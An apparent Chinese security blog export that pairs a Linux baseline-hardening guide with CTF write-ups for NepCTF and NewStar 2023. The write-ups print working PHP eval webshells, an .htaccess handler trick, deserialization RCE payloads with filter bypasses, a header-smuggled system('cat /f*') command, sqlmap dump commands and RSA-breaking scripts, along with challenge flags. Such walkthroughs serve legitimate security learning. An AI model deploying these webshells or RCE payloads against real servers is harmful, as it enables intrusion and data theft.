[{"title":"Linux安全基线检查及加固","url":"/Linux%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E5%8F%8A%E5%8A%A0%E5%9B%BA/","content":"Linux安全基线检查及加固系统加固检查点\n账号安全\n空口令用户\numask值的重要性\nsu的限制\n密码最长有效期\n密码复杂性\n\n\n系统安全基线\n检查grub密码\n修改内核网络参数\n禁止Control-Alt-Delete键盘关闭命令\n修改命令历史记录条目数以及时间标签\n设置登录超时时间\n\n\n\n空口令用户\n利用cat /etc/shadow指令，上图kali后的为用户的密码，查看用户是否存在空口令，但是，这种方法容易看漏相关信息\n\n空口令和隐藏管理员检查\n\n$1 用户名  $2 密码占用符$3 UID$4 组\n\n\n使用命令awk -F: &#39;($2==&quot;&quot;)&#123;print $1&#125;&#39; /etc/shadow查看空口令账号  $1为第一个字段即用户名\n\n使用命令awk -F: &#39;($3==0)&#123;print $1&#125;&#39; /etc/passwd查看UID为0的账号\n\numask值的重要性\numask作用：主要是针对新创建的文件的权限管理，比如你umask设置的是022 那你创建一个新文件默认的权限就是644 (644的二进制 110 010 010)属主读写 同组读 其他用户读\nrwx  &#x3D;&gt;  r&#x3D;read(读取) w&#x3D;write(写入) x(exe)(执行)\n\n限制用户使用su使用命令vim /etc/pasm.d/su 修改配置文件，去除第六行的注释符号，表示在wheel组中的用户才能够成功使用su命令，其他用户无法使用。如果需要其他组支持该功能可以添加内容。\n\n\n例如：只允许test组用户su到root\nauth required pam_wheel.so group=test\n密码最长有效期在文件/etc/login.defs 中进行设置如下参数\nPASS_MAX_DAYS   180  #密码最长过期天数PASS_MIN_DAYS   30  #密码最小过期天数PASS_MIN_LEN    12  #密码最小长度PASS_WARN_AGE   20   #密码过期警告天数\n\n\n密码复杂性\n文件编辑\n/etc/pam.d/system-auth \nDebian系列系统：/etc/pam.d/common-password\n\n\n\n密码历史或拒绝重复使用密码是什么？这个参数控制密码历史。它记录曾经使用过的密码（禁止使用的曾用密码的个数）。当用户设置新的密码时，它会检查密码历史，如果他们要设置的密码是一个曾经使用过的旧密码，将会发出警告提示。这个参数可以在 /etc/pam.d/system-auth 文件中设置。我设置密码历史为 5。\n# vi /etc/pam.d/system-authpassword  sufficient  pam_unix.so md5 shadow nullok try_first_pass use_authtok remember=5\n\n密码最小长度是什么？这个参数表示密码的最小长度。当用户设置新密码时，系统会检查这个参数，如果新设的密码长度小于这个参数设置的值，会收到警告提示。这个参数可以在 /etc/pam.d/system-auth 文件中设置。我设置最小密码长度为 12。\n# vi /etc/pam.d/system-authpassword  requisite   pam_cracklib.so try_first_pass retry=3 minlen=12\n\ntry_first_pass retry=3：在密码设置交互界面，用户有 3 次机会重设密码。\n设置最少的大写字母个数？这个参数表示密码中至少需要的大写字母的个数。这些是密码强度参数，可以让密码更健壮。当用户设置新密码时，系统会检查这个参数，如果密码中没有大写字母，会收到警告提示。这个参数可以在 /etc/pam.d/system-auth 文件中设置。我设置密码（中的大写字母）的最小长度为 1 个字母。\n# vi /etc/pam.d/system-authpassword   requisite   pam_cracklib.so try_first_pass retry=3 minlen=12 ucredit=-1\n\n设置最少的小写字母个数？这个参数表示密码中至少需要的小写字母的个数。这些是密码强度参数，可以让密码更健壮。当用户设置新密码时，系统会检查这个参数，如果密码中没有小写字母，会收到警告提示。这个参数可以在 /etc/pam.d/system-auth 文件中设置。我设置为 1 个字母。\n# vi /etc/pam.d/system-authpassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 lcredit=-1\n\n设置密码中最少的数字个数？这个参数表示密码中至少需要的数字的个数。这些是密码强度参数，可以让密码更健壮。当用户设置新密码时，系统会检查这个参数，如果密码中没有数字，会收到警告提示。这个参数可以在 /etc/pam.d/system-auth 文件中设置。我设置为 1 个数字。\n# vi /etc/pam.d/system-authpassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 dcredit=-1\n\n设置密码中最少的其他字符（符号）个数？这个参数表示密码中至少需要的特殊符号的个数。这些是密码强度参数，可以让密码更健壮。当用户设置新密码时，系统会检查这个参数，如果密码中没有特殊符号，会收到警告提示。这个参数可以在 /etc/pam.d/system-auth 文件中设置。我设置为 1 个字符。\n# vi /etc/pam.d/system-authpassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 ocredit=-1\n\n设置账号锁定？这个参数控制用户连续登录失败的最大次数。当达到设定的连续失败登录次数阈值时，锁定账号。这个参数可以在 /etc/pam.d/system-auth 文件中设置。\n# vi /etc/pam.d/system-authauth        required      pam_tally2.so onerr=fail audit silent deny=5account required pam_tally2.so\n\n设定账号解锁时间？这个参数表示用户解锁时间。如果一个用户账号在连续认证失败后被锁定了，当过了设定的解锁时间后，才会解锁。设置被锁定中的账号的解锁时间（900 秒 &#x3D; 15分钟）。这个参数可以在 /etc/pam.d/system-auth 文件中设置。\n# vi /etc/pam.d/system-authauth        required      pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900account required pam_tally2.so\n\n来源:https://linux.cn/\n检查grub密码弱口令防范，暴力破解防御\n设置连续输错3次密码，账号锁定3分钟(kali 没有这两个文件)\n\n文件编辑\n\n/etc/pam.d/system-auth\n/etc/pam.d/password-auth\n\n\n配置内容，在源文件第一行下配置如下两行\n\nauth required pam_tally2.so deny=3 unlock time=30 enven_deny_root root_unlock_time=30\n\naccount required pam_tally2.so\n\n\n\n\n","categories":["基线检查","Linux"],"tags":["基线检查","Linux安全基线","安全基线加固"]},{"title":"NepCTF 2023","url":"/NepCTF-2023/","content":"与AI共舞的哈夫曼\n\n下载文件 源码\n\nimport heapqimport osclass HuffmanNode:    def __init__(self, char, freq):        self.char = char        self.freq = freq        self.left = None        self.right = None    def __lt__(self, other):        return self.freq &lt; other.freqdef build_huffman_tree(frequencies):    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]    heapq.heapify(heap)    while len(heap) &gt; 1:        left = heapq.heappop(heap)        right = heapq.heappop(heap)        merged = HuffmanNode(None, left.freq + right.freq)        merged.left = left        merged.right = right        heapq.heappush(heap, merged)    return heap[0]def build_huffman_codes(node, current_code, huffman_codes):    if node is None:        return    if node.char is not None:        huffman_codes[node.char] = current_code        return    build_huffman_codes(node.left, current_code + &#x27;0&#x27;, huffman_codes)    build_huffman_codes(node.right, current_code + &#x27;1&#x27;, huffman_codes)def compress(input_file, output_file):    with open(input_file, &#x27;rb&#x27;) as f:        data = f.read()    frequencies = &#123;&#125;    for byte in data:        if byte not in frequencies:            frequencies[byte] = 0        frequencies[byte] += 1    root = build_huffman_tree(frequencies)    huffman_codes = &#123;&#125;    build_huffman_codes(root, &#x27;&#x27;, huffman_codes)    compressed_data = &#x27;&#x27;    for byte in data:        compressed_data += huffman_codes[byte]    padding = 8 - len(compressed_data) % 8    compressed_data += &#x27;0&#x27; * padding    with open(output_file, &#x27;wb&#x27;) as f:        # Write frequency information        f.write(bytes([len(frequencies)]))        for byte, freq in frequencies.items():            f.write(bytes([byte, (freq &gt;&gt; 24) &amp; 0xFF, (freq &gt;&gt; 16) &amp; 0xFF, (freq &gt;&gt; 8) &amp; 0xFF, freq &amp; 0xFF]))        # Write compressed data        for i in range(0, len(compressed_data), 8):            byte = compressed_data[i:i+8]            f.write(bytes([int(byte, 2)]))if __name__ == &quot;__main__&quot;:    input_file = &#x27;input.txt&#x27;    compressed_file = &#x27;compressed.bin&#x27;    decompressed_file = &#x27;decompressed.txt&#x27;    # 压缩文件    compress(input_file, compressed_file)    # 解压缩文件    decompress(compressed_file, decompressed_file)\n\n\n观察源码发现 缺少解压缩函数 编写解压缩函数\n\ndef decompress(input_file, output_file):    # 读取压缩文件中的数据    with open(input_file, &#x27;rb&#x27;) as f:        compressed_data = f.read()        # print(compressed_data)    # 读取频率信息    num_symbols = compressed_data[0]    # print(num_symbols)    frequencies = &#123;&#125;    index = 1    for _ in range(num_symbols):        symbol = compressed_data[index]        # print(symbol)        freq = (compressed_data[index + 1] &lt;&lt; 24) | (compressed_data[index + 2] &lt;&lt; 16) | (compressed_data[index + 3] &lt;&lt; 8) | compressed_data[index + 4]        frequencies[symbol] = freq        index += 5    # 重建 Huffman 树    root = build_huffman_tree(frequencies)    # 解压缩数据    current_node = root    decompressed_data = []    for byte in compressed_data[index:]:        byte_value = int(byte)        for i in range(7, -1, -1):            bit = (byte_value &gt;&gt; i) &amp; 1            if bit == 0:                current_node = current_node.left            else:                current_node = current_node.right            if current_node.char is not None:                decompressed_data.append(current_node.char)                current_node = root    # 将解压缩后的数据写入文件    with open(output_file, &#x27;wb&#x27;) as f:        f.write(bytes(decompressed_data))\n\n\n运行代码得到decompressed.txt\n\n\ncodes\n\n进入访问页面后：\n\n\n\n\n观察得到 需要输入C语言代码，输入system后没有正常显示，猜测可能是被过滤了\n\n于是通过argv 直接打印命令行参数\n\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123;    // 打印命令行参数    printf(&quot;Command line arguments:\\n&quot;);    for (int i = 0; i &lt; 20; i++) &#123;        printf(&quot;argv[%d]: %s\\n&quot;, i, argv[i]);    &#125;    return 0;&#125;\n\n\n","categories":["CTF","NepCTF 2023"],"tags":["ctf","misc"]},{"title":"NewStar 2023 Week2","url":"/NewStar-WriteUp-Week2/","content":"NewStar 2023 Week2WEB游戏高手\n\n打开题目看到上述，显然不可能玩到100000分，首先bp抓包看看有什么发现\n\n\n\n似乎没有什么有用信息，查看源代码，好像有有用信息app_v2.js js文件\n\n\n\n查看js文件于是有了想法：是否可以直接修改原始的分数\n\n\n\n调试器，在20行设置断点，F5刷新后，在控制台输入：gameScore = 100000\n\n\n\n接着返回调试器，可以看到此时的gameScore的值为100000\n\n\n\n接着F8,让js代码顺利执行，进入游戏会发现原始分变成了100000，结束游戏即可得到flag\n\n\ninclude 0。0\n打开就看到源码\n\n &lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil &#123;    private $cmd;    public function __destruct()    &#123;        if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123;            @system($this-&gt;cmd);        &#125;    &#125;&#125;@unserialize($_POST[&#x27;unser&#x27;]);?&gt; \n\n\n发现过滤了base和rot ，但是还有其他一些过滤器可以用\n构造payload：php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php\n\n\n\n成功拿到flagflag&#123;670e28dc-940b-4d66-92ec-40be4a0ae771&#125;\n\nez_sql\n看到题目，肯定是sql注入相关的，直接sqlmap扫描\nsqlmap -u &quot;http://a53134e7-8ebc-46e4-bc62-ac46e2b91837.node4.buuoj.cn:81/?id=TMP11503&quot; --dbs  \n\n\n\n\n直接使用 --dump,列出所有的表数据\n\n\n\n​\tflag&#123;ae2227f2-2ea1-4cd8-84b7-ad1d21cda25d&#125;\nUnserialize?\n打开看到源码\n\n &lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil &#123;    private $cmd;    public function __destruct()    &#123;        if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123;            @system($this-&gt;cmd);        &#125;    &#125;&#125;@unserialize($_POST[&#x27;unser&#x27;]);?&gt; \n\n\n发现只需要设置evil类中cmd成员的值然后反序列化触发__destruct析构函数即可触发RCE\n\n发现过滤了cat|tac|more|tail|base，但是可以用ls 查看目录，构造payload\n\n\n&lt;?phpclass evil&#123;    public $cmd = &#x27;ls&#x27;;&#125;$e = new evil();echo urlencode(serialize($e));?&gt;        # 运行结果  O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22ls%22%3B%7D\n\n\n\n发现当前目录只有index.php,于是查看根目录\n\n&lt;?phpclass evil&#123;    public $cmd = &#x27;ls /&#x27;;&#125;$e = new evil();echo urlencode(serialize($e));?&gt;    # 运行结果  O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D\n\n\n需要注意的是运行结果中有 + 需要将+改成%20，得到根目录\n\n\n找到可疑目录th1s_1s_fffflllll4444aaaggggg,但是cat被过滤，想办法绕过\n\n\n&lt;?phpclass evil&#123;    public $cmd = &#x27;ca``t th1s_1s_fffflllll4444aaaggggg&#x27;;&#125;$e = new evil();echo urlencode(serialize($e));?&gt;    # 运行结果 O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A36%3A%22ca%60%60t+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D\n\n\nUpload again!\n\n首先利用bp抓包试试，正常上传图片正常回显\n\n\n将图片后缀更改为php，显示错误\n\n\n试着上传图片马，还是能检测出来\n\n\n猜测可能是检测了后缀，以及检测图片内容中是否包含了php代码，试着去掉php代码\n\n\n仍然被检测出来，现在猜测可能是由于&lt;? ?&gt;，去掉&lt;? ?&gt;,保留php中的代码，发现能成功上传\n\n\n利用script代替标签\n&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;111111&#x27;]);&lt;/script&gt;\n\n\n但是，图片中的php代码不能被解析，尝试先上传.htaccess文件，在上传对应图片，这样图片中的php代码就能被解析\n&lt;FilesMatch &quot;evil.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n\n\n\n接着上传 evil.png文件\n\n\n接着用蚁剑连接，查询可疑文件\n\n\n\nflag&#123;4366f19d-3ec5-4dec-801f-113d944e370a&#125;\nR!!C!!E!!根据提示有信息泄露，可以使用dirsearch扫，扫出了 &#x2F;.git\n使用githack工具获取源码\n\nbo0g1pop.php源码：\n&lt;?phphighlight_file(__FILE__);if (&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;    if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123;        eval($_GET[&#x27;star&#x27;]);    &#125;&#125;\n\n根据提示绕过两处正则：\n\n第一个正则对提交的参数进行处理：任意字符加上可选的括号（允许嵌套）更换为空，然后判断是否等于分号，结合下面的 eval 可以知道就是无参数命令执行。\n第二个正则过滤了一些常用的用于无参数命令执行的 php 方法，但过滤不全，可以使用类似功能的方法进行绕过，最终命令执行。\n\n官方payload（使用 bp 发送的请求）：\nGET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1Host: faf83665-1a88-473a-b765-ddd33c6cf370.node4.buuoj.cn:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeX-Forwarder-Proto: system(&#x27;cat /f*&#x27;);Upgrade-Insecure-Requests: 1\n\n有一篇writeup写的很好：https://www.cnblogs.com/EddieMurphy-blogs/articles/17752305.html\nCrypto滴啤\n根据提示 应该考察的是RSA dp泄露\n\n\n看到注释的三条数据，大概率就是dp泄露，编写dp泄露脚本\n\n\nimport gmpy2import libnumn= 93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931e= 65537c= 52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089dp= 307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635p=gmpy2.gcd(pow(2,e*dp,n)-2,n)print(p)for i in range(1, e):    p = (dp * e - 1) // i + 1    if n % p == 0:        q = n // p        print(q)        breakprint(q)phi_n = (p - 1) * (q - 1)d = gmpy2.invert(e, phi_n)m = pow(c, d, n)print(m)flag = libnum.n2s(int(m))print(flag)\n\n\nflag&#123;cd5ff82d-989c-4fbf-9543-3f98ab567546&#125;\n不止一个pi\n同样根据题目和给出的python代码，猜测仍然是RSA中的 e和phi不互素，即是 存在两个或多个模数且gcd(N1,N2)!=1\n\n\nimport gmpy2import libnump = 171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217q = 115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713e = 65537c = 4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337n = p * qphi = (p - 1) * (q - 1)t = gmpy2.gcd(e, phi)t1 = e // tdt1 = gmpy2.invert(t1, phi)mt1 = pow(c, dt1, n)print(mt1)s, m = gmpy2.iroot(mt1, t)print(s)print(libnum.n2s(int(s)))\n\n\nflag&#123;bu_zhi_yige_p1dsaf&#125;\nhalfcandecodeout.txt：\na8a08f09d37b73795649038408b5f3303c7c0ace395d80182db07ae2c30f034e1671797c52e15f763380b45e841ec32b14a7b8059d9c055954c92674ce60032e358efa489f58062f10dd7316b65649ecfcd208495d565ef66e7dff9f98764dab14a7b8059d9c055954c92674ce600328fa14cdd754f91cc6554c9e71929cce70cc175b9c0f1b6a831c399e2697726614a8a08f09d37b73795649038408b5f33e358efa489f58062f10dd7316b65649ecfcd208495d565ef66e7dff9f98764da4b43b0aee35624cd95b910189b3dc231cbb184dd8e05c9709e5dcaedaa0495cf\n\ntask.py\nfrom Crypto.Util.number import *import gmpy2from flag import flagimport osfrom hashlib import md5def gen_prime(number):    p = getPrime(number // 2)    q = gmpy2.next_prime(p)    return p * qdef md5_hash(m):    return md5(m.encode()).hexdigest()e = 65537n = gen_prime(1024)m1 = bytes_to_long(flag[:len(flag) // 2].encode() + os.urandom(8))c1 = pow(m1, e, n)m2 = flag[len(flag) // 2:]with open(&quot;out.txt&quot;,&quot;w&quot;) as f:    f.write(str(n) + &#x27;\\n&#x27;)    f.write(str(c1) + &#x27;\\n&#x27;)    for t in m2:        f.write(str(md5_hash(t))+&#x27;\\n&#x27;)\n\n首先判断是RSA 的加密，根据提示，猜测可能flag由两端构成\n首先大素数分解,RSA解密：\nimport gmpy2from Crypto.Util.number import *# 公钥ee = 65537# 欧拉函数eular euler = (p - 1) * (q - 1)p = 10631151190024160908870967192522097752991652918777416177941351782447314225123009693276679810786266997133099934443701772661928189884235742113123409596993409q = 10631151190024160908870967192522097752991652918777416177941351782447314225123009693276679810786266997133099934443701772661928189884235742113123409596993841eular = (p - 1) * (q - 1)n = 113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969c = 43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649# 私钥dd = gmpy2.invert(e, eular)m = pow(c, d, n)print(long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))# print(long_to_bytes(m).decode(&#x27;latin-1&#x27;, errors=&#x27;ignore&#x27;))# print(long_to_bytes(m).decode(&#x27;gbk&#x27;, errors=&#x27;ignore&#x27;))\n\n得到前半段flag：flag&#123;two_cloab\n接着md5解密，后半段：cse_t0_fact0r&#125;\npartial decrypt题目：\nfrom secret import flagfrom Crypto.Util.number import *m = bytes_to_long(flag)e = 65537p = getPrime(512)q = getPrime(512)n = p*q c = pow(m,e,n)dp = inverse(e, (p-1))dq = inverse(e, (q-1))m1 = pow(c,dp, p)m2 = pow(c,dq, q)q_inv = inverse(q, p)h = (q_inv*(m1-m2)) % pprint(&#x27;m2 =&#x27;, m2)print(&#x27;h =&#x27;, h)print(&#x27;q =&#x27;, q)# m2 = 4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884# h = 4180720137090447835816240697100630525624574275# q = 7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931\n\n这是关于RSA-CRT(中国剩余定理)\nfrom Crypto.Util.number import *m2 = 4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884h = 4180720137090447835816240697100630525624574275q = 7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931m = m2+h*qprint(long_to_bytes(m))\n\n\n","categories":["CTF","NewStar 2023"],"tags":["ctf","crypto","web"]},{"title":"NewStar 2023 Week1","url":"/NewStar-2023/","content":"NewStar WriteUp Week1web泄露的秘密\n看到题目 首先想到 信息泄露相关的知识点：想到 phpinfo.php test.php …. \n​\t\t\t最后到robots.txt 得到一半flag：\n\nPART ONE: flag&#123;r0bots_1s_s0_us3ful\nwww.zip: \n\n$PART_TWO = &quot;_4nd_www.zip_1s_s0_d4ng3rous&#125;&quot;;\n&lt;?php$PART_TWO = &quot;_4nd_www.zip_1s_s0_d4ng3rous&#125;&quot;;echo &quot;&lt;h1&gt;粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！&lt;/h1&gt;&quot;;\n\nBegin of Upload\n典型的文件上传漏洞 简单的尝试一下：\n利用bp抓包 修改后缀以及添加一句话php后门代码： &lt;?php @eval($_POST[&#39;111111&#39;]);?&gt;\n\n上传成功 利用蚁剑连接\n\n发现flagflag&#123;ba65aadc-84ca-4ece-9a14-fadf4362f3c3&#125;\nErrorFlask打开靶机显示：\n\n先利用抓包 简单构造number1和number2：\n\n不是ssti模版注入，想到是整型数字可以正常得出结果，假如是字符会得出什么：\n\n页面500 搜索flag 得到flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;\nBegin of HTTP\n首先打开目标靶机\n\n\n发现可能首先涉及的是get方式传参数 ctf，利用抓包看看效果\n\n\n页面给出提示 ，后续需要利用POST请求给secret传值，但是具体传什么还不知道，首先查看源代码\n\n\n发现了小东西：&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt; 利用base64解密得到：n3wst4rCTF2023g00000d\n\n\n进行post传值secret=n3wst4rCTF2023g00000d\n\n\n成功传值后给出下一步提示：发现cookie中存在power 于是将power修改为ctfer\n\n\n下一步提示需要修改浏览器，即是修改UA  User-Agent: NewStarCTF2023\n\n\n继续跟着提示修改Referer: newstarctf.com \n\n\n本来以为结束了，既然还有，限制只允许本地用户，首先想到X-Forwarded-For，但是尝试了X-Forwarded-For:127.0.0.1没有任何效果，继续查阅相关http的资料发现 x-real-ip也能限制本地用户\n\n\n得到flag：flag&#123;17b2edf3-a19b-4e8f-8639-cb2c5edb7000&#125;\n\n\n整个题的思路还是很简单，只需要跟着题目的提示来解决就行，主要是要了解http的相关知识。\nBegin of PHP\n首先打开靶机看到php代码：\n &lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;key1&#x27;]) &amp;&amp; isset($_GET[&#x27;key2&#x27;]))&#123;    echo &quot;=Level 1=&lt;br&gt;&quot;;    if($_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;] &amp;&amp; md5($_GET[&#x27;key1&#x27;]) == md5($_GET[&#x27;key2&#x27;]))&#123;        $flag1 = True;    &#125;else&#123;        die(&quot;nope,this is level 1&quot;);    &#125;&#125;if($flag1)&#123;    echo &quot;=Level 2=&lt;br&gt;&quot;;    if(isset($_POST[&#x27;key3&#x27;]))&#123;        if(md5($_POST[&#x27;key3&#x27;]) === sha1($_POST[&#x27;key3&#x27;]))&#123;            $flag2 = True;        &#125;    &#125;else&#123;        die(&quot;nope,this is level 2&quot;);    &#125;&#125;if($flag2)&#123;    echo &quot;=Level 3=&lt;br&gt;&quot;;    if(isset($_GET[&#x27;key4&#x27;]))&#123;        if(strcmp($_GET[&#x27;key4&#x27;],file_get_contents(&quot;/flag&quot;)) == 0)&#123;            $flag3 = True;        &#125;else&#123;            die(&quot;nope,this is level 3&quot;);        &#125;    &#125;&#125;if($flag3)&#123;    echo &quot;=Level 4=&lt;br&gt;&quot;;    if(isset($_GET[&#x27;key5&#x27;]))&#123;        if(!is_numeric($_GET[&#x27;key5&#x27;]) &amp;&amp; $_GET[&#x27;key5&#x27;] &gt; 2023)&#123;            $flag4 = True;        &#125;else&#123;            die(&quot;nope,this is level 4&quot;);        &#125;    &#125;&#125;if($flag4)&#123;    echo &quot;=Level 5=&lt;br&gt;&quot;;    extract($_POST);    foreach($_POST as $var)&#123;        if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123;            die(&quot;nope,this is level 5&quot;);        &#125;    &#125;    if($flag5)&#123;        echo file_get_contents(&quot;/flag&quot;);    &#125;else&#123;        die(&quot;nope,this is level 5&quot;);    &#125;&#125; \n\n\n\n进行代码审计，发现大概思路是首先输入key1和key2满足两个输入的值不同但是md5值相同得到flag1 接着满足其他条件依次得到flag2，flag3，flag4，由flag5得到flag\n\n首先找到key1和key2满足两个输入的值不同但是md5值相同\nkey1= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975%EA%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%DDa7%D0%40%C6i%97%10l%84%9D%BA%7FK%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhjj%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2AF%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0Cw%0E%A3%94%9Bkey2= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975j%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%5Db7%D0%40%C6i%97%10l%84%9D%BA%7F%CB%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhj%EA%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2%C1E%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0C%F7%0E%A3%94%9B\n\n\n\n根据提示已经进入level 2 此时要满足md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;]\n像这样的强比较，传入的不是字符串而是数组，不但md5() 和 sha1()函数不会报错，结果还会返回null，在强比较里面null&#x3D;null为true绕过\n\n\n此时已经显示进入level 3 ，接着满足strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)\nstrcmp 的参数只能是 字符串，当我们传入数组时就会返回NULL，而判断使用的是&#x3D;&#x3D;，NULL&#x3D;&#x3D;0是 bool(true)的\n\n\n现在进入level 4，现在需要满足!is_numeric($_GET[&#39;key5&#39;]) &amp;&amp; $_GET[&#39;key5&#39;] &gt; 2023\n\n\n最后到达level 5，根据\nextract($_POST);   foreach($_POST as $var)&#123;       if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123;           die(&quot;nope,this is level 5&quot;);       &#125;   &#125;   if($flag5)&#123;       echo file_get_contents(&quot;/flag&quot;);   &#125;\n\n首先要过滤preg_match，接着要构造flag5\n建议：当初不是很明白，利用phpstudy构造此页面进行测试\nif($flag4)&#123;    echo &quot;=Level 5=&lt;br&gt;&quot;;    extract($_POST);    print_r($_POST);    foreach($_POST as $var)&#123;        print_r($var);        if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123;            die(&quot;nope,this is level 5-1&quot;);        &#125;    &#125;    if($flag5)&#123;        echo &quot;hello&quot;;        echo file_get_contents(&quot;/flag&quot;);    &#125;else&#123;        die(&quot;nope,this is level 5-2&quot;);    &#125;&#125; 